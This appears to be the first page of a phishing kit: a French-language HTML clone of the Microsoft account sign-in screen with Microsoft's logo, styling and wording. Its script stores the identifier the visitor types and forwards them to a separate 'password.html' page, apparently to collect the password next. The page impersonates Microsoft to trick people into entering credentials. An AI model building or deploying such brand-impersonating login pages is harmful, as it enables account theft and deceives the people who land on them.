<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion à votre compte Microsoft</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, Roboto, sans-serif; }
        body { background: radial-gradient(circle at 80% 20%, #e5eef9 0%, #f3f5f8 50%, #eddfe9 100%); min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 440px; }
        .login-box { background: #ffffff; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); margin-bottom: 20px; width: 100%; min-height: 338px; }
        .logo { display: flex; align-items: center; margin-bottom: 20px; }
        .ms-logo { display: grid; grid-template-columns: repeat(2, 1fr); gap: 2px; width: 21px; height: 21px; margin-right: 12px; }
        .ms-logo span { display: block; }
        .red { background-color: #f25022; } .green { background-color: #7fba00; } .blue { background-color: #00a4ef; } .yellow { background-color: #ffb900; }
        .brand-name { font-size: 16px; font-weight: 600; color: #737373; }
        h2 { color: #1b1b1b; font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        .input-group { margin-bottom: 18px; }
        input[type="text"] { width: 100%; padding: 6px 0; font-size: 15px; border: none; border-bottom: 1px solid #666666; outline: none; }
        input[type="text"]:focus { border-bottom: 2px solid #0067b8; }
        .text-link { font-size: 13px; color: #1b1b1b; margin-bottom: 14px; }
        a { color: #0067b8; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .button-group { display: flex; justify-content: flex-end; margin-top: 32px; }
        .btn-primary { background-color: #0067b8; color: #ffffff; border: none; padding: 6px 20px; min-width: 108px; font-size: 15px; cursor: pointer; }
        .btn-primary:hover { background-color: #005da6; }
        .options-box { background: #ffffff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); width: 100%; }
        .btn-options { width: 100%; background: none; border: none; padding: 12px 44px; display: flex; align-items: center; cursor: pointer; }
        .btn-options span { font-size: 15px; color: #2b2b2b; margin-left: 12px; }
        .btn-options:hover { background-color: #f2f2f2; }
        footer { position: absolute; bottom: 12px; right: 20px; display: flex; gap: 16px; }
        footer a { color: #000000; font-size: 11px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <div class="ms-logo"><span class="red"></span><span class="green"></span><span class="blue"></span><span class="yellow"></span></div>
                <span class="brand-name">Microsoft</span>
            </div>
            <h2>Se connecter</h2>
            <form id="form-email">
                <div class="input-group">
                    <input type="text" id="username" placeholder="E-mail, téléphone ou identifiant Skype" required autocomplete="off">
                </div>
                <p class="text-link">Vous n'avez pas encore de compte ? <a href="#">Créez-en un !</a></p>
                <p class="text-link"><a href="#">Votre compte n'est pas accessible ?</a></p>
                <div class="button-group">
                    <button type="submit" class="btn-primary">Suivant</button>
                </div>
            </form>
        </div>
        <div class="options-box">
            <button class="btn-options">
                <svg viewBox="0 0 24 24" width="20" height="20"><path d="M7 18a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm11.6-4.6a1 1 0 0 0-1.4 0l-7.5 7.5a6 6 0 1 0 2.8 2.8l1.4-1.4h1.7v1.7a1 1 0 0 0 1 1h1.7v1.7a1 1 0 0 0 1 1h2.2a1 1 0 0 0 1-1v-2.2a1 1 0 0 0-.3-.7l-4.1-4.1v-1.7h1.7a1 1 0 0 0 1-1v-1.7h1.7a1 1 0 0 0 .7-.3l.7-.7a1 1 0 0 0 0-1.4z" fill="#555"/></svg>
                <span>Options de connexion</span>
            </button>
        </div>
    </div>
    <footer>
        <a href="#">Conditions d'utilisation</a>
        <a href="#">Confidentialité et cookies</a>
    </footer>
    <script>
        document.getElementById('form-email').addEventListener('submit', function(e) {
            e.preventDefault();
            const emailValue = document.getElementById('username').value;
            localStorage.setItem('user_email', emailValue);
            window.location.href = 'password.html';
        });
    </script>
</body>
</html>
